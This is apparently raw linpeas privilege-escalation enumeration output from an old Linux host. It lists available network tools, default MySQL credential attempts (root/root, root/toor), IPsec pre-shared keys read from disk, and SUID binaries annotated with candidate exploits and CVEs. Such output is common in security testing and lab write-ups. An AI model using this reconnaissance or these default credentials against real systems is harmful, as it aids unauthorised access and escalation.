./linpeas.sh: line 3044: command: authbind: not found
./linpeas.sh: line 3044: command: aws: not found
./linpeas.sh: line 3044: command: base64: not found
./linpeas.sh: line 3044: command: ctr: not found
/usr/bin/curl
./linpeas.sh: line 3044: command: doas: not found
./linpeas.sh: line 3044: command: docker: not found
./linpeas.sh: line 3044: command: fetch: not found
./linpeas.sh: line 3044: command: g++: not found
./linpeas.sh: line 3044: command: gcc: not found
./linpeas.sh: line 3044: command: gdb: not found
./linpeas.sh: line 3044: command: kubectl: not found
./linpeas.sh: line 3044: command: lxc: not found
/usr/bin/make
/usr/bin/nc
./linpeas.sh: line 3044: command: nc.traditional: not found
./linpeas.sh: line 3044: command: ncat: not found
./linpeas.sh: line 3044: command: netcat: not found
./linpeas.sh: line 3044: command: nmap: not found
/usr/bin/perl
/usr/bin/php
/bin/ping
./linpeas.sh: line 3044: command: podman: not found
/usr/bin/python
/usr/bin/python2
./linpeas.sh: line 3044: command: python2.6: not found
./linpeas.sh: line 3044: command: python2.7: not found
./linpeas.sh: line 3044: command: python3: not found
./linpeas.sh: line 3044: command: python3.6: not found
./linpeas.sh: line 3044: command: python3.7: not found
./linpeas.sh: line 3044: command: rkt: not found
./linpeas.sh: line 3044: command: ruby: not found
./linpeas.sh: line 3044: command: runc: not found
./linpeas.sh: line 3044: command: socat: not found
/usr/bin/sudo
/usr/bin/wget
./linpeas.sh: line 3044: command: xterm: not found

╔══════════╣ Installed Compilers

╔══════════╣ MySQL version
mysql  Ver 14.7 Distrib 4.1.22, for redhat-linux-gnu (i686) using readline 4.3


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found
Server version: Apache/2.0.52
Server built:   Jun 29 2009 10:17:32
Nginx version: nginx Not Found

══╣ PHP exec extensions


-rw-r--r--  1 root root 38449 Sep 16  2009 /etc/php.ini
allow_call_time_pass_reference = Off
allow_url_fopen = On
odbc.allow_persistent = On
mysql.allow_persistent = On
msql.allow_persistent = On
pgsql.allow_persistent = On
sybase.allow_persistent = On
sybct.allow_persistent = On
ifx.allow_persistent = On
mssql.allow_persistent = On
ingres.allow_persistent = On



╔══════════╣ Analyzing Http conf Files (limit 70)
-rw-r--r--  1 root root 34704 Jun 29  2009 /etc/httpd/conf/httpd.conf
AccessFileName .htaccess

╔══════════╣ Searching ssl/ssh files
══╣ Some certificates were found (out limited):
/etc/vmware-tools/GuestProxyData/server/cert.pem
/var/lib/vmware-caf/pme/data/input/certs/cacert.pem
/var/lib/vmware-caf/pme/data/input/certs/privateKey.pem
/var/lib/vmware-caf/pme/data/input/certs/publicKey.pem
10896PSTORAGE_CERTSBIN

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
	GSSAPIAuthentication yes
       ForwardX11Trusted yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x  2 root root 4096 Jan 17  2018 /etc/pam.d
-rw-------  1 root root 317 Aug 22  2008 /etc/pam.d/sshd


╔══════════╣ Analyzing NFS Exports Files (limit 70)
-rw-r--r--  1 root root 0 Jan 12  2000 /etc/exports

./linpeas.sh: line 3483: command: kadmin: not found
./linpeas.sh: line 3484: command: klist: not found
╔══════════╣ Searching kerberos conf files and tickets
╚ http://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory
ptrace protection is enabled (), you need to disable it to search for tickets inside processes memory
-rw-r--r--  1 root root 615 Sep 16  2009 /etc/krb5.conf
[logging]
 default = FILE:/var/log/krb5libs.log
 kdc = FILE:/var/log/krb5kdc.log
 admin_server = FILE:/var/log/kadmind.log

[libdefaults]
 default_realm = EXAMPLE.COM
 dns_lookup_realm = false
 dns_lookup_kdc = false

[realms]
 EXAMPLE.COM = {
  kdc = kerberos.example.com:88
  admin_server = kerberos.example.com:749
  default_domain = example.com
 }

[domain_realm]
 .example.com = EXAMPLE.COM
 example.com = EXAMPLE.COM

[kdc]
 profile = /var/kerberos/krb5kdc/kdc.conf

[appdefaults]
 pam = {
   debug = false
   ticket_lifetime = 36000
   renew_lifetime = 36000
   forwardable = true
   krb4_convert = false
 }
tickets kerberos Not Found
klist Not Found



╔══════════╣ Analyzing Backup Manager Files (limit 70)
-rw-r--r--  1 root root 15197 Jun  1  2009 /usr/share/pear/DB/storage.php


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/doc/nss_ldap-253/pam.d/passwd

./linpeas.sh: line 3769: command: gitlab-rails: not found
./linpeas.sh: line 3769: command: gitlab-backup: not found
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-------  1 root root 1160 Dec  5  2006 /etc/sysconfig/rhn/up2date-keyring.gpg


./linpeas.sh: line 3842: command: ctr: not found
./linpeas.sh: line 3856: command: runc: not found
╔══════════╣ Analyzing Kubernetes Files (limit 70)


-rw-------  1 root root 212 Sep  7  2008 /etc/racoon/psk.txt
-rw-r--r--  1 root root 610 Sep  7  2008 /usr/share/doc/ipsec-tools-0.3.3/psk.txt
# IPv4/v6 addresses
10.160.94.3	mekmitasdigoat
172.16.1.133	mekmitasdigoat
194.100.55.1	whatcertificatereally
203.178.141.208	mekmitasdigoat
206.175.160.18	mekmitasdigoat
206.175.160.20	mekmitasdigoat
206.175.160.21	mekmitasdigoat
206.175.160.22	mekmitasdigoat
206.175.160.23	mekmitasdigoat
206.175.160.36	mekmitasdigoat
206.175.161.125	mekmitasdigoat
206.175.161.154	mekmitasdigoat
206.175.161.156	mekmitasdigoat
206.175.161.182	mekmitasdigoat
3ffe:501:410:ffff:200:86ff:fe05:80fa	mekmitasdigoat
3ffe:501:410:ffff:210:4bff:fea2:8baa	mekmitasdigoat
# USER_FQDN
sakane@kame.net	mekmitasdigoat
# FQDN
kame		hoge






╔══════════╣ Analyzing Postfix Files (limit 70)
-rwxr-xr-x  1 root root 26197 Jul 25  2008 /etc/log.d/scripts/services/postfix


╔══════════╣ Analyzing Racoon Files (limit 70)
-rw-------  1 root root 414 Sep  7  2008 /etc/racoon/racoon.conf
-rw-r--r--  1 root root 2818 Sep  7  2008 /usr/share/doc/ipsec-tools-0.3.3/racoon.conf
path include "/etc/racoon";
path pre_shared_key "/etc/racoon/psk.txt";
path certificate "/etc/cert";
padding
{
	maximum_length 20;	# maximum padding length.
	randomize off;		# enable randomize length.
	strict_check off;	# enable strict check.
	exclusive_tail off;	# extract last one octet.
}
listen
{
	#isakmp ::1 [7000];
	#isakmp 202.249.11.124 [500];
	#admin [7002];		# administrative's port by kmpstat.
	#strict_address; 	# required all addresses must be bound.
}
timer
{
	# These value can be changed per remote node.
	counter 5;		# maximum trying count to send.
	interval 20 sec;	# maximum interval to resend.
	persend 1;		# the number of packets per a send.
	# timer for waiting to complete each phase.
	phase1 30 sec;
	phase2 15 sec;
}
remote anonymous
{
	exchange_mode main,aggressive;
	doi ipsec_doi;
	situation identity_only;
	my_identifier asn1dn;
	certificate_type x509 "my.cert.pem" "my.key.pem";
	nonce_size 16;
	initial_contact on;
	proposal_check obey;	# obey, strict or claim
	proposal {
		encryption_algorithm 3des;
		hash_algorithm sha1;
		authentication_method rsasig;
		dh_group 2;
	}
}
remote ::1 [8000]
{
	#exchange_mode main,aggressive;
	exchange_mode aggressive,main;
	doi ipsec_doi;
	situation identity_only;
	my_identifier user_fqdn "sakane@kame.net";
	peers_identifier user_fqdn "sakane@kame.net";
	#certificate_type x509 "mycert" "mypriv";
	nonce_size 16;
	lifetime time 1 min;	# sec,min,hour
	proposal {
		encryption_algorithm 3des;
		hash_algorithm sha1;
		authentication_method pre_shared_key;
		dh_group 2;
	}
}
sainfo anonymous
{
	pfs_group 2;
	encryption_algorithm 3des;
	authentication_algorithm hmac_sha1;
	compression_algorithm deflate;
}
sainfo address 203.178.141.209 any address 203.178.141.218 any
{
	pfs_group 2;
	lifetime time 30 sec;
	encryption_algorithm des;
	authentication_algorithm hmac_md5;
	compression_algorithm deflate;
}
sainfo address ::1 icmp6 address ::1 icmp6
{
	pfs_group 3;
	lifetime time 60 sec;
	encryption_algorithm 3des, blowfish, aes;
	authentication_algorithm hmac_sha1, hmac_md5;
	compression_algorithm deflate;
}

-rw-------  1 root root 212 Sep  7  2008 /etc/racoon/psk.txt
-rw-r--r--  1 root root 610 Sep  7  2008 /usr/share/doc/ipsec-tools-0.3.3/psk.txt
# IPv4/v6 addresses
10.160.94.3	mekmitasdigoat
172.16.1.133	mekmitasdigoat
194.100.55.1	whatcertificatereally
203.178.141.208	mekmitasdigoat
206.175.160.18	mekmitasdigoat
206.175.160.20	mekmitasdigoat
206.175.160.21	mekmitasdigoat
206.175.160.22	mekmitasdigoat
206.175.160.23	mekmitasdigoat
206.175.160.36	mekmitasdigoat
206.175.161.125	mekmitasdigoat
206.175.161.154	mekmitasdigoat
206.175.161.156	mekmitasdigoat
206.175.161.182	mekmitasdigoat
3ffe:501:410:ffff:200:86ff:fe05:80fa	mekmitasdigoat
3ffe:501:410:ffff:210:4bff:fea2:8baa	mekmitasdigoat
# USER_FQDN
sakane@kame.net	mekmitasdigoat
# FQDN
kame		hoge

╔══════════╣ Analyzing Windows Files (limit 70)






















-rw-r--r--  1 root root 308 Jul 25  2008 /etc/my.cnf









-rw-r--r--  1 root root 1003 May 20  2003 /usr/lib/python2.3/site-packages/Ft/Server/Server/Dashboard/server.xml
-rw-r--r--  1 root root 2193 Jan 25  2003 /usr/lib/python2.3/site-packages/Ft/Share/Demos/server.xml





drwxr-xr-x  2 root root 4096 Sep  4  2011 /usr/src/kernels/2.6.9-101.EL-i686/include/config/software













╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r--  1 root root 124 Jun  1  2009 /etc/skel/.bashrc











                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strace Not Found
-r-s--x--x  1 root root 20K Jun  1  2009 /sbin/pam_timestamp_check
-r-sr-xr-x  1 root root 295K Jun  1  2009 /sbin/pwdb_chkpwd
-r-sr-xr-x  1 root root 47K Jun  1  2009 /sbin/unix_chkpwd
-rwsr-x---  1 root squid 10K Apr 10  2008 /usr/lib/squid/ncsa_auth
-rwsr-x---  1 root squid 9.8K Apr 10  2008 /usr/lib/squid/pam_auth
-r-sr-xr-x  1 root root 9.4K Jan 17  2018 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x  1 root root 14K Jan 17  2018 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x  1 root root 6.6K Jun  1  2009 /usr/sbin/userisdnctl
-rwsr-xr-x  1 root root 6.0K May  2  2007 /usr/sbin/ccreds_validate
-rws--x--x  1 root root 31K Jul 25  2008 /usr/sbin/userhelper
-r-s--x---  1 root apache 11K Jun 29  2009 /usr/sbin/suexec
-rwsr-xr-x  1 root root 15K Jul  2  2009 /usr/sbin/usernetctl
-rws--x--x  1 root root 429K Aug 22  2008 /usr/libexec/openssh/ssh-keysign
-rwsr-xr-x  1 root root 7.3K May 31  2009 /usr/libexec/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
-rwsr-xr-x  1 root root 122K Jun  1  2009 /usr/kerberos/bin/ksu
-rwsr-xr-x  1 root root 42K Jan 31  2008 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rws--x--x  1 root root 18K Jun  1  2009 /usr/bin/chsh
-rwsr-xr-x  1 root root 71K Jul 25  2008 /usr/bin/sg (Unknown SUID binary!)
-rws--x--x  1 root root 7.6K Jun  1  2009 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x  1 root root 116K Jul 25  2008 /usr/bin/chage
-rwsr-xr-x  1 root root 8.5K May 10  2006 /usr/bin/rsh  --->  Apple_Mac_OSX_10.9.5/10.10.5(09-2015)
-rwsr-xr-x  1 root root 13K May 10  2006 /usr/bin/rlogin
-rws--x--x  1 root root 18K Jun  1  2009 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x  1 root root 133K Jul 25  2008 /usr/bin/gpasswd
-rwsr-xr-x  1 root root 17K May 10  2006 /usr/bin/rcp  --->  RedHat_6.2
---s--x--x  1 root root 92K Jun  1  2009 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-r-s--x--x  1 root root 21K Aug 21  2005 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x  1 root root 20K Jun  1  2009 /usr/bin/lppasswd
-rwsr-xr-x  1 root root 204K Jun  1  2009 /usr/bin/crontab
-rwsr-xr-x  1 root root 33K Jun  1  2009 /bin/ping
-rwsr-xr-x  1 root root 13K Jun  1  2009 /bin/traceroute6
-rwsr-xr-x  1 root root 57K Jun  1  2009 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x  1 root root 60K Jul  2  2009 /bin/su
-rwsr-xr-x  1 root root 86K Jun  1  2009 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x  1 root root 24K Jun 30  2009 /bin/traceroute  --->  LBL_Traceroute_[2000-11-15]
-rwsr-xr-x  1 root root 31K Jun  1  2009 /bin/ping6

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x  1 root root 12K Jul  2  2009 /sbin/netreport
-rwxr-sr-x  1 root utmp 11K Feb 21  2005 /usr/sbin/utempter
-rwxr-sr-x  1 root lock 16K Apr  4  2006 /usr/sbin/lockdev
-rwxr-sr-x  1 root smmsp 729K Jul 25  2008 /usr/sbin/sendmail.sendmail
-r-xr-sr-x  1 root tty 9.6K May  5  2007 /usr/bin/wall
-rwxr-sr-x  1 root nobody 59K Aug 22  2008 /usr/bin/ssh-agent
-rwxr-sr-x  1 root mail 15K Nov 16  2007 /usr/bin/lockfile
-rwxr-sr-x  1 root tty 9.9K Jun  1  2009 /usr/bin/write
-rwxr-sr-x  1 root slocate 38K Nov 16  2007 /usr/bin/slocate

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include ld.so.conf.d/*.conf
ld.so.conf.d
  ld.so.conf.d/*
cat: ld.so.conf.d/*: No such file or directory

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
./linpeas.sh: line 4383: command: capsh: not found
Current capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000

Shell capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000

Files with capabilities (limited to 50):

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/url_handler.sh
/usr/bin/lesspipe.sh
/usr/bin/go-rhn.sh
/usr/bin/mksmbpasswd.sh
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)

╔══════════╣ Unexpected in root
/selinux
/misc
/initrd
/.bash_history
/.autofsck

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 112
drwxr-xr-x   2 root root  4096 Sep 16  2009 .
drwxr-xr-x  81 root root 12288 Mar  3 21:17 ..
-rwxr-xr-x   1 root root   764 Jul  2  2009 colorls.csh
-rwxr-xr-x   1 root root   725 Jul  2  2009 colorls.sh
-rwxr-xr-x   1 root root   192 Feb 21  2005 glib2.csh
-rwxr-xr-x   1 root root   190 Feb 21  2005 glib2.sh
-rwxr-xr-x   1 root root   218 Jun  1  2009 krb5.csh
-rwxr-xr-x   1 root root   210 Jun  1  2009 krb5.sh
-rwxr-xr-x   1 root root  2182 Jul  2  2009 lang.csh
-rwxr-xr-x   1 root root  2470 Jul  2  2009 lang.sh
-rwxr-xr-x   1 root root   122 Sep 13  2006 less.csh
-rwxr-xr-x   1 root root   108 Sep 13  2006 less.sh
-rwxr-xr-x   1 root root   170 Feb 21  2005 which-2.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/var/www
/var/www/usage/usage_200909.html
/var/www/usage/usage_201003.html
/var/www/usage/hourly_usage_201003.png
/var/www/usage/ctry_usage_201003.png
/var/www/usage/ctry_usage_200909.png
/var/www/usage/index.html
/var/www/usage/usage.png
/var/www/usage/hourly_usage_200909.png
/var/www/usage/daily_usage_201003.png
/var/www/usage/daily_usage_200909.png
/var/www/error
/var/www/error/HTTP_NOT_FOUND.html.var
/var/www/error/HTTP_UNSUPPORTED_MEDIA_TYPE.html.var
/var/www/error/HTTP_FORBIDDEN.html.var
/var/www/error/HTTP_METHOD_NOT_ALLOWED.html.var
/var/www/error/HTTP_VARIANT_ALSO_VARIES.html.var
/var/www/error/contact.html.var
/var/www/error/noindex.html
/var/www/error/HTTP_REQUEST_ENTITY_TOO_LARGE.html.var
/var/www/error/HTTP_BAD_REQUEST.html.var
/var/www/error/include
/var/www/error/include/bottom.html
/var/www/error/include/top.html
/var/www/error/include/spacer.html
/var/www/error/HTTP_REQUEST_URI_TOO_LARGE.html.var
/var/www/error/HTTP_REQUEST_TIME_OUT.html.var
/var/www/error/HTTP_PRECONDITION_FAILED.html.var
/var/www/error/HTTP_BAD_GATEWAY.html.var

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/cups/access_log
/var/log/vmware-vmsvc.log
/var/log/messages
/var/log/cron

logrotate: bad argument --version: unknown error

╔══════════╣ Files inside / (limit 20)
total 182
drwxr-xr-x   23 root root  4096 Sep  1  2022 .
drwxr-xr-x   23 root root  4096 Sep  1  2022 ..
-rw-r--r--    1 root root     0 Sep  1  2022 .autofsck
-rw-------    1 root root    62 Sep 17  2009 .bash_history
drwxr-xr-x    2 root root  4096 Sep 16  2009 bin
drwxr-xr-x    4 root root  1024 Sep 16  2009 boot
drwxr-xr-x    9 root root  5860 Sep  1  2022 dev
drwxr-xr-x   81 root root 12288 Mar  3 21:17 etc
drwxr-xr-x    2 root root  4096 Feb 21  2005 home
drwxr-xr-x    2 root root  4096 Feb 21  2005 initrd
drwxr-xr-x   12 root root  4096 Mar  3 21:17 lib
drwx------    2 root root 16384 Sep 16  2009 lost+found
drwxr-xr-x    3 root root  4096 Sep  1  2022 media
drwxr-xr-x    2 root root  4096 Jun  1  2009 misc
drwxr-xr-x    3 root root  4096 Sep 29  2011 mnt
drwxr-xr-x    2 root root  4096 Feb 21  2005 opt
dr-xr-xr-x  110 root root     0 Sep  1  2022 proc
drwxr-x---    3 root root  4096 Mar  3 15:13 root
drwxr-xr-x    2 root root 12288 Jan 17  2018 sbin
drwxr-xr-x    2 root root  4096 Sep 16  2009 selinux
drwxr-xr-x    2 root root  4096 Feb 21  2005 srv
drwxr-xr-x    9 root root     0 Sep  1  2022 sys

╔══════════╣ Files inside others home (limit 20)
/var/www/usage/usage_200909.html
/var/www/usage/usage_201003.html
/var/www/usage/hourly_usage_201003.png
/var/www/usage/ctry_usage_201003.png
/var/www/usage/ctry_usage_200909.png
/var/www/usage/index.html
/var/www/usage/usage.png
/var/www/usage/hourly_usage_200909.png
/var/www/usage/daily_usage_201003.png
/var/www/usage/daily_usage_200909.png
/var/www/usage/msfree.png
/var/www/usage/webalizer.png
/var/www/error/HTTP_NOT_FOUND.html.var
/var/www/error/HTTP_UNSUPPORTED_MEDIA_TYPE.html.var
/var/www/error/HTTP_FORBIDDEN.html.var
/var/www/error/HTTP_METHOD_NOT_ALLOWED.html.var
/var/www/error/HTTP_VARIANT_ALSO_VARIES.html.var
/var/www/error/contact.html.var
/var/www/error/noindex.html
/var/www/error/HTTP_REQUEST_ENTITY_TOO_LARGE.html.var

╔══════════╣ Searching installed mail applications
mailq.sendmail
newaliases.sendmail
rmail.sendmail
sendmail
sendmail.sendmail

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)
-rw-r--r--  1 root root 432 Jan  2  2013 /etc/modprobe.conf.old.2
-rw-r--r--  1 root root 432 Aug  8  2012 /etc/modprobe.conf.old.1
-rw-r--r--  1 root root 207 Jan 17  2018 /etc/vmware-tools/vmware-user.desktop.old.3
-rw-r--r--  1 root root 339 Aug  8  2012 /etc/vmware-tools/vmware-user.desktop.old.0
-rw-r--r--  1 root root 339 Jan  2  2013 /etc/vmware-tools/vmware-user.desktop.old.1
-rw-r--r--  1 root root 207 Feb 27  2015 /etc/vmware-tools/vmware-user.desktop.old.2
-rw-r--r--  1 root root 503 Sep 29  2011 /etc/modprobe.conf.old.0
-rw-r--r--  1 root root 303 Sep 29  2011 /etc/updatedb.conf.old.0
-rw-r--r--  1 root root 1262 Jun  1  2009 /usr/share/man/man8/tdbbackup.8.gz
-r--r--r--  1 root root 644 Jun  1  2009 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r--  1 root root 3689 Nov 20  2008 /usr/share/doc/samba-3.0.33/htmldocs/manpages/tdbbackup.8.html
-rw-r--r--  1 root root 15905 Jun 16  2000 /usr/share/doc/minicom-2.00.0/doc/ChangeLog.old
-r--r--r--  1 root root 1243 Aug 16  2003 /usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi/Filter/exec.pm.bak
-r--r--r--  1 root root 1471 Aug 16  2003 /usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi/Filter/sh.pm.bak
-r--r--r--  1 root root 2181 Aug 16  2003 /usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi/Filter/cpp.pm.bak
-rw-r--r--  1 root root 0 Sep 29  2011 /usr/lib/vmware-tools/bin.old.0
-rw-r--r--  1 root root 0 Sep 29  2011 /usr/lib/vmware-tools/sbin.old.0
-rw-r--r--  1 root root 160 Jan  2  2013 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangorc.old.1
-rw-r--r--  1 root root 160 Jan 17  2018 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangorc.old.3
-rw-r--r--  1 root root 160 Aug  8  2012 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangorc.old.0
-rw-r--r--  1 root root 160 Feb 27  2015 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangorc.old.2
-rw-r--r--  1 root root 5300 Jan  2  2013 /usr/lib/vmware-tools/lib32/libconf/etc/fonts/fonts.conf.old.1
-rw-r--r--  1 root root 5300 Feb 27  2015 /usr/lib/vmware-tools/lib32/libconf/etc/fonts/fonts.conf.old.2
-rw-r--r--  1 root root 5300 Aug  8  2012 /usr/lib/vmware-tools/lib32/libconf/etc/fonts/fonts.conf.old.0
-rw-r--r--  1 root root 5300 Jan 17  2018 /usr/lib/vmware-tools/lib32/libconf/etc/fonts/fonts.conf.old.3
-rw-r--r--  1 root root 3939 Jan 17  2018 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gdk-pixbuf.loaders.old.3
-rw-r--r--  1 root root 2087 Aug  8  2012 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gtk.immodules.old.0
-rw-r--r--  1 root root 2087 Jan  2  2013 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gtk.immodules.old.1
-rw-r--r--  1 root root 3939 Feb 27  2015 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gdk-pixbuf.loaders.old.2
-rw-r--r--  1 root root 3939 Jan  2  2013 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gdk-pixbuf.loaders.old.1
-rw-r--r--  1 root root 2087 Feb 27  2015 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gtk.immodules.old.2
-rw-r--r--  1 root root 2087 Jan 17  2018 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gtk.immodules.old.3
-rw-r--r--  1 root root 3939 Aug  8  2012 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gdk-pixbuf.loaders.old.0
-rwxr-xr-x  1 root root 34632 Jan 17  2018 /usr/lib/vmware-tools/plugins64/vmsvc/libvmbackup.so
-rwxr-xr-x  1 root root 29888 Jan 17  2018 /usr/lib/vmware-tools/plugins32/vmsvc/libvmbackup.so

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /etc/aliases.db: writable, regular file, no read permission
Found /etc/mail/access.db: writable, regular file, no read permission
Found /etc/mail/domaintable.db: writable, regular file, no read permission
Found /etc/mail/mailertable.db: writable, regular file, no read permission
Found /etc/mail/virtusertable.db: writable, regular file, no read permission
Found /var/lib/webalizer/dns_cache.db: Berkeley DB (Hash, version 8, native byte-order)


╔══════════╣ Web files?(output limit)
/var/www/:
total 64K
drwxr-xr-x   8 root      root 4.0K Sep 16  2009 .
drwxr-xr-x  21 root      root 4.0K Sep 16  2009 ..
drwxr-xr-x   2 root      root 4.0K Jun 29  2009 cgi-bin
drwxr-xr-x   3 root      root 4.0K Sep 16  2009 error
drwxr-xr-x   3 root      root 4.0K Sep 17  2009 html
drwxr-xr-x   3 root      root 4.0K Sep 16  2009 icons
drwxr-xr-x  13 root      root 4.0K Sep 16  2009 manual
drwxr-xr-x   2 webalizer root 4.0K Feb  3  2011 usage

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-------  1 root root 0 Sep 16  2009 /etc/.pwd.lock
-rw-r--r--  1 root root 24 Jun  1  2009 /etc/skel/.bash_logout
-rw-r--r--  1 root root 0 Jun  1  2009 /usr/share/pear/.lock
-rw-r--r--  1 root root 7588 Jun  1  2009 /usr/share/pear/.filemap
-rw-r--r--  1 root root 40 Jun  1  2009 /usr/share/man/man1/..1.gz
-rw-r--r--  1 root root 7 Jul  9  2003 /usr/share/doc/freetype-2.1.9/docs/reference/.cvsignore
-rw-r--r--  1 root root 70 Aug  4  2009 /usr/share/comps/i386/.discinfo
-rw-r--r--  1 root root 106637 Jun 30  2009 /usr/lib/perl5/5.8.5/i386-linux-thread-multi/.packlist
-rw-r--r--  1 root root 22342 Jun 14  2007 /usr/lib/perl5/vendor_perl/5.8.5/i386-linux-thread-multi/auto/mod_perl/.packlist
-rw-r--r--  1 root root 1330 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/.kallsyms.cmd
-rw-r--r--  1 root root 1573 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/.pnmtologo.cmd
-rw-r--r--  1 root root 2411 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/kconfig/.zconf.tab.o.cmd
-rw-r--r--  1 root root 2876 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/kconfig/.mconf.o.cmd
-rw-r--r--  1 root root 113 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/kconfig/.libkconfig.so.cmd
-rw-r--r--  1 root root 1738 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/kconfig/.conf.o.cmd
-rw-r--r--  1 root root 130 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/kconfig/.conf.cmd
-rw-r--r--  1 root root 1426 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/mod/.mk_elfconfig.cmd
-rw-r--r--  1 root root 129 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/mod/.modpost.cmd
-rw-r--r--  1 root root 1820 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/mod/.file2alias.o.cmd
-rw-r--r--  1 root root 2487 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/mod/.sumversion.o.cmd
-rw-r--r--  1 root root 1860 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/mod/.modpost.o.cmd
-rw-r--r--  1 root root 704 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/mod/.empty.o.cmd
-rw-r--r--  1 root root 109 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/mod/.elfconfig.h.cmd
-rw-r--r--  1 root root 1811 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/basic/.split-include.cmd
-rw-r--r--  1 root root 2196 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/basic/.docproc.cmd
-rw-r--r--  1 root root 2496 Jul 21  2011 /usr/src/kernels/2.6.9-101.EL-i686/scripts/basic/.fixdep.cmd
